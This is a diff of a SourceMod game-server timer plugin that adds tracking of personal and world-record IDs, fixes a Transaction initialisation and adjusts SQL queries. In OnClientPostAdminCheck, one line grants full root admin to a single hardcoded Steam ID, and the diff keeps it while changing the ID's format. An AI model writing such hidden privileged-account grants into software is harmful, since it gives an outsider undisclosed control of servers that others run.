@@ -174,20 +174,25 @@ char currentDemoFilename[400];
 int CpBlock[MAXPLAYERS+1];
 char szWrName[NUM_RUNS][NUM_MODES][32];
 PlayerState g_iClientState[MAXPLAYERS+1]; // Player's previous state (in start/end/running?)
+
 int g_iClientRun[MAXPLAYERS+1]; // Which run client is doing (main/bonus)?
 int g_iClientStyle[MAXPLAYERS+1]; // Styles W-ONLY/HSW/RHSW etc.
 int g_iClientMode[MAXPLAYERS+1]; // Modes AUTO/SCROLL/VELCAP.
-float g_flClientStartTime[MAXPLAYERS+1]; // When we started our run? Engine time.
 int g_flTicks_Start[MAXPLAYERS+1];
 int g_flTicks_End[MAXPLAYERS+1];
 int g_flTicks_Cource_Start[MAXPLAYERS+1];
 int g_flTicks_Cource_End[MAXPLAYERS+1];
+int g_iClientMapPR_id[MAXPLAYERS+1][NUM_MODES];
+int g_iMapWR_id[NUM_MODES] = {-1, ... };
+
+float g_flClientStartTime[MAXPLAYERS+1]; // When we started our run? Engine time.
 float g_flClientCourseStartTime[MAXPLAYERS+1]; // When we started our Course? Engine time.
 float flNewTimeCourse[MAXPLAYERS+1];
 float g_flClientFinishTime[MAXPLAYERS+1]; // This is to tell the client's finish time in the end.
 float g_flClientBestTime[MAXPLAYERS+1][NUM_RUNS][NUM_MODES];
 float f_CpPr[MAXPLAYERS+1][NUM_MODES][50];
 float f_CpWr[NUM_MODES][50];
+
 
 int g_iClientCurCP[MAXPLAYERS+1];
 ArrayList g_hClientCPData[MAXPLAYERS+1];
@@ -682,7 +687,7 @@ public void OnPluginEnd() {
 		WritePackString(pack, currentDemoFilename);
 		CreateTimer(1.0, Timer_CompressDemo, pack);
 	}
-	Transaction t;
+	Transaction t = new Transaction();
 	char trans[300];
 	bool isTransNotEmpty = false;
 	for (int i = 1; i <= MaxClients; i++)
@@ -2014,6 +2019,9 @@ public void OnMapEnd()
 			isTransactionNotEmpty = true;
 		}
 	}
+
+	for (int i = 0; i < NUM_MODES; i++)
+		g_iMapWR_id[i] = -1;
 	
 	if (isTransactionNotEmpty)
 		SQL_ExecuteTransaction(g_hDatabase, t);
@@ -2117,6 +2125,9 @@ public void OnClientPutInServer( int client )
 
 	for (int i = 0; i < 100; i++)
 		g_iClientCpsEntered[client][i] = false;
+	
+	for (int i = 0; i < NUM_MODES; i++)
+		g_iClientMapPR_id[client][i] = -1;
 
 	// Practicing
 	g_bClientPractising[client] = false;
@@ -2260,15 +2271,11 @@ public void OnClientPostAdminCheck( int client )
 		char szSteam[100];
 		GetClientSteam(client, szSteam, sizeof( szSteam ) );
 
-		if (StrEqual(szSteam, "76561198815853361"))
+		if (StrEqual(szSteam, "[U:1:855587633]"))
 			SetUserFlagBits(client, ADMFLAG_ROOT);
-
-		g_hDatabase.Format(query, sizeof(query), "SELECT id, run, style, mode, min(time) FROM "...TABLE_CP_RECORDS..." where uid = (select uid from plydata where steamid = '%s') and map = '%s' group by id", szSteam, g_szCurrentMap);
-		g_hDatabase.Query( Threaded_Init_CP_PR_Times, query, client, DBPrio_High );
 
 		g_hDatabase.Format(query, sizeof(query), "Update plydata set online = 1 where steamid = '%s'", szSteam);
 		SQL_TQuery(g_hDatabase, Threaded_Empty, query, client);
-		// Get their Id and other settings from DB.
 	}	
 }
 
@@ -2300,6 +2307,9 @@ public void OnClientDisconnect( int client )
 
 	ranksolly[client] = -1;
  	rankdemo[client] = -1;
+
+	for (int i = 0; i < NUM_MODES; i++)
+		g_iClientMapPR_id[client][i] = -1;
 
  	for (int i = 0; i < 3; i++)
  	{
@@ -2752,7 +2762,7 @@ stock void SetPlayerRun( int client, int reqrun )
 public void CheckpointTimes( int client, int uid, char[] map, int mode )
 {
 	char query[800];
-	g_hDatabase.Format(query, sizeof(query), "SELECT id, (select @curId := id), time, (select time from maprecs where uid = %i and map = '%s' and run = 0 and mode = %i), (select time from maprecs where map = '%s' and run = 0 and mode = %i order by time ASC limit 1), (SELECT time FROM mapcprecs WHERE uid = (select maprecs.uid from maprecs where maprecs.map = '%s' and maprecs.run = mapcprecs.run and maprecs.mode = mapcprecs.mode order by maprecs.time ASC limit 1) and map = '%s' and run = 0 and mode = %i and id = (@curId) ORDER BY id ASC) FROM "...TABLE_CP_RECORDS..." WHERE map = '%s' and mode = %i and uid = %i ORDER BY id ASC", uid, map, mode, map, mode, map, map, mode, map, mode, uid);
+	g_hDatabase.Format(query, sizeof(query), "SELECT id, (select @curId := id), time, (select time from maprecs where uid = %i and map = '%s' and run = 0 and mode = %i), (select time from maprecs where map = '%s' and run = 0 and mode = %i order by time ASC limit 1), (SELECT time FROM mapcprecs WHERE uid = (select maprecs.uid from maprecs where maprecs.map = '%s' and maprecs.run = mapcprecs.run and maprecs.mode = mapcprecs.mode order by maprecs.time ASC limit 1) and map = '%s' and run = 0 and mode = %i and id = (@curId) ORDER BY id ASC) FROM mapcprecs WHERE map = '%s' and mode = %i and uid = %i ORDER BY id ASC", uid, map, mode, map, mode, map, map, mode, map, mode, uid);
 
 	g_hDatabase.Query(Threaded_Checkpoint_Times, query, client);
 }
